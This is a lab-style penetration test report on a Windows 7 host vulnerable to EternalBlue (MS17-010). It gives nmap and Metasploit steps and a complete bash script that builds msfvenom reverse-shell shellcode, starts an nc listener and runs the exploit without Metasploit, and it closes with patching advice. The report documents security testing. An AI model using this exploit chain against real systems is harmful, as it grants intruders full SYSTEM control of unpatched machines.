---
title: "Support Script Pentest"
author: OreoByte
date: "2020-12-30"
subject: "Black Box Pentest"
subtitle: "Black Box Report"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---

# Introduction

The startup company "Support Script" only has enough resources to support a single subnet. The client has had problems with social engineering attacks in the past. Worry that anyone who has access to their network through phasing attacks will be able to attack their server.

# Scope Of Engagement

Given internal VPN access. Can a shell with the highest privilege user be obtained on the internal server? This will be a black box test. The machine's IPv4 address will be provided and nothing else. Any vulnerabilities exploited with `Metasploit`. Must also be exploited without `Metasploit`. However, `Msfvenom` is alright to use in this engagement.

\pagebreak

# Inital Recon

```
nmap -p- -sC -sV -Pn -oA nmap_output 10.10.116.66 -v
```

![](https://i.imgur.com/krSSO2c.png)

The full TCP `nmap` scan shows that port 445 SMB is open. A crackmapexec SMB scan to check password policy and double-check if the domain found is the same `JON-PC`.

![](https://i.imgur.com/9Kb0dM8.png)

\pagebreak

# Vulnerabilty Scans

From the previous scans. The Operating System of the server is `Windows 7 Professional 7601 Service Pack 1 x64`. A older version of `Windows`. Vulnerabilty scans to find any commmmon vulnerabilities that will help with future exploitation.

## Nmap Vulnerabilty Scan

```
nmap -p 135,139,445,3389,49152,49153,49154,49155,49156,49157,49158,49159 -Pn -sC -sV --script +vuln 10.10.116.66 -oN vuln_scan
```

![](https://i.imgur.com/FTF8HH3.png)

A `nmap` vulnerability scan with all the ports discovered. Shows the server vulnerable to `Eternalblue CVE-2017-0143`.

## Metasploit Eteranbleblue Vulnerablity Scan

To make sure `nmap` was not a false positive. Double-checking with Metasploit's `smb_ms17_010` check module. Configuring the module with the server's IP address and SMBDomain of `JON_PC`.

![](https://i.imgur.com/CXTR4pO.png)

![](https://i.imgur.com/yIdmmuq.png)


![](https://i.imgur.com/VvRRkQn.png)

The `smb_ms17_010` check module confirms it is likely vulnerable to `Eternalblue`. However, it does not return any named pipes such as `\netlogon` or other.

\pagebreak

# Eteranlblue

## Exploitation With Metasploit

Exploitation of `Eternalblue` with Metasploit can be done with the `ms17_010_eternalblue` exploit module. Set the server's IP address and SMBDomain of`JON_PC`before running the exploit.

![](https://i.imgur.com/vpeo4Bc.png)

![](https://i.imgur.com/6rmHFSC.png)

![](https://i.imgur.com/5KtK5lO.png)

Exploitation with Metasploit's `ms17_010_eternalblue` module is successful. Local enumeration with `getuid` and `sysinfo`. This shows that our meterpreter session has the highest local system privileges `NT AUTHORITY\SYYSTEM` on the server `JON-PC`. These permissions allow an attacker to dump local hashes and migrate to a different process for a more stable shell.

![](https://i.imgur.com/ux43LMY.png)

![](https://i.imgur.com/3lGQQY9.png)

## Exploitation Without Metasploit

### Searchsploit With Msfvenom

First searching for the Python script with searchsploit and copying to the local working directory with the `-m` argument.

![](https://i.imgur.com/qVV8cIs.png)

![](https://i.imgur.com/rhFYMfS.png)

Copy the original to another file. If there is a need to edit or locally restore the original file. 

`cp 42315.py feeling_blue.py`

![](https://i.imgur.com/SC3wes2.png)

From the imported Python modules. The Python script has a missing mysmb and can't be installed using pip. The mysmb module install from `https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py` with `wget`.

![](https://i.imgur.com/hlqqQF3.png)

Now to create the payload with `msfvenom` and modify the Python script to include the new payload.

![](https://i.imgur.com/FcMxp3h.png)

Start the listener for the reverse shell before running the Python script.

![](https://i.imgur.com/1SieN9W.png)

![](https://i.imgur.com/lQQB0ag.png)

The Python script runs, however, fails with no valid name pipe. There may be a different named pipe list we can use to check if there is an accessible named pipe. With the Metasploit auxiliary scanner module used before `smb_ms17_010`. To use in the Python script as `python3 feeling_blue.py 10.10.90.199 <named_pipe_name>`.

### Assembly With Msfvenom

Another method of exploiting `Eternalblue` is by compiling the assembly exploit code. The code and supporting files will used from `https://github.com/worawit/MS17-010` Github repository.

![](https://i.imgur.com/zrNubyO.png)

![](https://i.imgur.com/9ol5Kdj.png)

\pagebreak

Built a small bash script to help make compiling the assembly. To make it easier with setting the `attacker IP address`, `server IP address`, and `attacker listening port`.

```
#!/bin/bash
# eternalblue without metasploit github script
# how to run
# chmod +x script.sh
# ./script.sh lhost lport rhost
help () {
    echo -e "\nMS17-010 Assembly and msfvenom Help Menu\n----\n-l | lhost ipv4 address"
    echo "-p | lport listening port"
    echo "-r | rport target ipv4 address"
    echo -e "-f | directory name to output shellcode\n\nExample:"
    echo -e "./blue.sh -l 192.168.1.45 -p 1337 -r 192.168.1.14 -f blue_code\n"
}
# help menu
if [ -z "$1" ]; then
    help
    exit 1
elif [ "$1" == "-h" ]; then
    help
    exit 1
else
while getopts l:p:r:f: opts
do
    case "$opts" in
    l) l_host=$OPTARG;;
    p) l_port=$OPTARG;;
    r) r_host=$OPTARG;;
    f) f_dir=$OPTARG;;
esac
done
fi

# grab code from github <already going to install that
check=`ls | grep -i "MS17-010"`
if [ "$check" == "MS17-010" ]; then
    echo -e "\nExploit Code Already Downloaded\n"
else
    git clone https://github.com/worawit/MS17-010.git
fi

#create listener for tmux
export heylisten=$l_port
tmux split-window -h nc -lvnp $heylisten

# create folder_for all the binaries
mkdir $f_dir

#compile for 64bit windows + payload creation
nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./$f_dir/sc_x64_kernel.bin
msfvenom -p windows/x64/shell_reverse_tcp LPORT=$l_port LHOST=$l_host --platform windows -a x64 --format raw -o ./$f_dir/sc_x64_payload.bin
cat ./$f_dir/sc_x64_kernel.bin ./$f_dir/sc_x64_payload.bin > ./$f_dir/sc_x64.bin

#compile for 32bit windows + payload creation
nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./$f_dir/sc_x86_kernel.bin
msfvenom -p windows/shell_reverse_tcp LPORT=$l_port LHOST=$l_host --platform windows -a x86 --format raw -o ./$f_dir/sc_x86_payload.bin
cat ./$f_dir/sc_x86_kernel.bin ./$f_dir/sc_x86_payload.bin > ./$f_dir/sc_x86.bin

# fuse binaries together
python MS17-010/shellcode/eternalblue_sc_merge.py ./$f_dir/sc_x86.bin ./$f_dir/sc_x64.bin ./$f_dir/sc_all.bin

# run exploit (with proxychians)
echo -e "\npython MS17-010/eternalblue_exploit7.py $r_host ./$f_dir/sc_all.bin\n"
python MS17-010/eternalblue_exploit7.py $r_host ./$f_dir/sc_all.bin
```

However, there is a problem. The script used to send the compiled shellcode `eternalblue_exploit7.py` is written for Python2 and doesn't have the impacket module installed. 

![](https://i.imgur.com/9CProKY.png)

Trying to install impacket for Python2 with pip shows it's already satisfied for Python3 instead.

![](https://i.imgur.com/cPyOQwj.png)

Modifying the python script to run it with Python3 as `#!/usr/bin/python3` returns `TypeError can't concat str to bytes`. This is because when adding two variables together. Both variables must have the same type. However Python3 bytes are written as `b'\x01\x02\x03\x04'` instead of `'\x01\x02\x03\04'` with Python2.

![](https://i.imgur.com/vkaTk7w.png)

After correcting bytes for Python3 in the `eternalblue_exploit7.py` script. Modifying bash script to use python3 as `python3 MS17-010/eternalblue_exploit7.py $r_host ./$f_dir/sc_all.bin`. Running the script again has Eternalblue run without Metasploit successfully. Returning a new shell in the split Tmux pane.

![](https://i.imgur.com/Fdrql3f.png)


![](https://i.imgur.com/NDuOfBS.png)

\pagebreak

# Client Remediation

Remediation of `Eternalblue` can be done with upgrade to the most updated version of the Windows Operating System `Windows 10`. If the server has to stay on `Windows 7`. Installing the patches to prevent `Eternalblue`.

## Recommendations

To upgrade to the most updated version of windows. The `Windows 10 installation media` can be used. Found on Microsoft website `https://www.microsoft.com/en-us/software-download/windows10`.

1. Download the ISO image
2. When running the media creation tool
3. Choose `Upgrade this PC now`, instead of creating installation media.
4. Follow prompts
5. Activate the new `Windows 10` operating system. From navigating to `settings Updaate & Security > Activation`, and adding the new digital Windows 10 license key.

To maintain Windows 7. I not automatically installed when running `Windows Update`. Information for Patching Eternalblue can be found on Microsoft's support page below.

`https://support.microsoft.com/en-us/topic/march-2017-security-only-quality-update-for-windows-7-sp1-and-windows-server-2008-r2-sp1-e5767049-3be1-3993-e67d-b4208c943850`

1. Select MS17-010
2. Selct Windows version below 
3. From the `Microsoft Update Catalog`. Download the correct version.
4. Run the local patch installer and reboot.
5. Verify changes under `Control Panel > Windows Updates > View update history`

| Host Operating System | Open Ports | Services | Obtained Access? | Vulnerabilities Exploited |
| --------------------- | ---------- | -------- | ---------------- | ------------------------- |
| Windows 7 Pro (6.1 Build 7601, Service Pack 1) | 135, 139, 445, 3389, 49152, 49153, 49154, 49155, 49156, 49157, 49158, 49159 | MSRPC, Netbios, SMB, RDP | YES | Meterpreter (ms17_010_eternalblue), Eteranlblue (Assembly, Msfvenom, Python3)
